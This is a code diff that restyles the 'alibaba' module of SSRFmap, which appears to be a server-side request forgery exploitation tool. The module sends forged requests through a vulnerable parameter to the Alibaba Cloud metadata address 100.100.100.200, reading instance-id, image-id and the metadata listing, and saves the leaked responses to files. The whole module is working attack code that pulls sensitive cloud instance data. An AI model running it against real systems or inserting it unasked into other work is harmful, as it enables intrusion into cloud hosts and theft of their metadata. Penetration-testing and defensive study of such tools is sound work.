@@ -1,14 +1,16 @@
-from ssrfmap.core.utils import *
 import logging
 import os
 
-name          = "alibaba"
-description   = "Access sensitive data from the Alibaba Cloud"
-author        = "Swissky"
-documentation = [""]
+from ssrfmap.core.utils import diff_text, wrapper_http
 
-class exploit():
-    endpoints = set()
+name = "alibaba"
+description = "Access sensitive data from the Alibaba Cloud"
+author = "Swissky"
+documentation: list[str] = [""]
+
+
+class exploit:
+    endpoints: set[tuple[str, str]] = set()
 
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
@@ -24,8 +26,8 @@ class exploit():
                 os.makedirs(directory)
 
             for endpoint in self.endpoints:
-                payload = wrapper_http(endpoint[1], endpoint[0] , "80")
-                r  = requester.do_request(args.param, payload)
+                payload = wrapper_http(endpoint[1], endpoint[0], "80")
+                r = requester.do_request(args.param, payload)
                 diff = diff_text(r.text, default)
                 if diff != "":
 
@@ -34,16 +36,19 @@ class exploit():
                     logging.debug(diff)
 
                     # Write diff to a file
-                    filename = endpoint[1].split('/')[-1]
+                    filename = endpoint[1].split("/")[-1]
                     if filename == "":
-                        filename = endpoint[1].split('/')[-2:-1][0]
+                        filename = endpoint[1].split("/")[-2:-1][0]
 
-                    logging.info("\033[32mWriting file\033[0m : {} to {}".format(payload, directory + "/" + filename))
-                    with open(directory + "/" + filename, 'w') as f:
+                    logging.info(
+                        "\033[32mWriting file\033[0m : {} to {}".format(
+                            payload, directory + "/" + filename
+                        )
+                    )
+                    with open(directory + "/" + filename, "w") as f:
                         f.write(diff)
 
-
     def add_endpoints(self):
-        self.endpoints.add( ("100.100.100.200","latest/meta-data/instance-id") )
-        self.endpoints.add( ("100.100.100.200","latest/meta-data/image-id") )
-        self.endpoints.add( ("100.100.100.200","latest/meta-data/") )
+        self.endpoints.add(("100.100.100.200", "latest/meta-data/instance-id"))
+        self.endpoints.add(("100.100.100.200", "latest/meta-data/image-id"))
+        self.endpoints.add(("100.100.100.200", "latest/meta-data/"))
